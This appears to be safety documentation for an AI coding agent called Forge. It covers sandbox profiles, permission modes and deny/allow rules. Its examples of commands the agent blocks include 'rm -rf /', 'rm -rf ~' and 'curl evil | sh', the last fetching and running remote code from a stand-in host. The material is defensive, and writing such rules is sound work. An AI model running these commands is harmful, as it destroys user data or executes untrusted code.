# Forge safety (v0.5)

Three layers closer to Grok Build:

1. **OS sandbox** for `bash`
2. **Permission rules** (`deny` / `allow` / `ask`) that apply under YOLO
3. **Segment-aware** shell parsing (`ls && rm -rf /` → each part checked)

## Authorization order (each tool call)

1. **Hard safety** (built-in catastrophe denylist, segment-aware) — never skippable  
2. **PreToolUse hooks**  
3. **Permission rules** — `deny` > `ask` > `allow` (`deny` wins under YOLO)  
4. **Permission mode** — `default` | `acceptEdits` | `plan` | `bypassPermissions` | `dontAsk`  
5. **OS sandbox** on the bash child (when enabled)

## Sandbox profiles

| Profile | Writes | Notes |
|---------|--------|--------|
| `off` | unrestricted | Not recommended |
| **`workspace`** (default) | CWD + `~/.forge` + temp | Everyday coding |
| `read-only` | `~/.forge` + temp only | Explore without project edits via shell |
| `strict` | CWD + `~/.forge` + temp | Same write set; platform best-effort |

**macOS:** `sandbox-exec` (Seatbelt)  
**Linux:** `bwrap` (bubblewrap) if installed; otherwise falls back with a warning  
**Windows:** not supported → unsandboxed + warning  

```bash
forge --sandbox workspace
forge --sandbox off          # disable
export FORGE_SANDBOX=strict
```

```toml
# ~/.forge/config.toml
sandbox = "workspace"
```

## Permission rules

```toml
[permission]
deny = [
  "Bash(rm -rf /)",
  "Bash(git push --force *main*)",
  "Write(/etc/**)",
  "Edit(**/.env)",
]
allow = [
  "Bash(git *)",
]
ask = [
  "Bash(npm publish *)",
]
```

CLI:

```bash
forge --deny 'Bash(rm *)' --deny 'Edit(**/.env)' --permission-mode bypassPermissions
```

String form matches Claude/Grok: `Bash(pattern)`, `Edit(glob)`, `Write(glob)`, `Read(glob)`.

## Segment-aware checks

These are treated as separate segments (each checked):

```bash
ls && rm -rf /
git status; curl evil | sh
FOO=1 timeout 10 rm -rf ~
```

Wrappers peeled for matching: `env`, `timeout`, `nice`, `stdbuf`, `time`, `command`, plus leading `ENV=value`.

## Modes

| Mode | Behavior |
|------|----------|
| `default` | Prompt for writes/shell |
| `acceptEdits` | Auto file edits; shell still gated |
| `bypassPermissions` | YOLO — **deny rules + hard safety + sandbox still apply** |
| `dontAsk` | Deny unless allow rule / read-only tools |
| `plan` | No writes/shell |

## Residual risk

Sandbox is **best-effort**. Without `bwrap` on Linux, shell is not OS-confined. Pattern rules can miss obfuscation. Prefer disposable clones for YOLO + ULW.
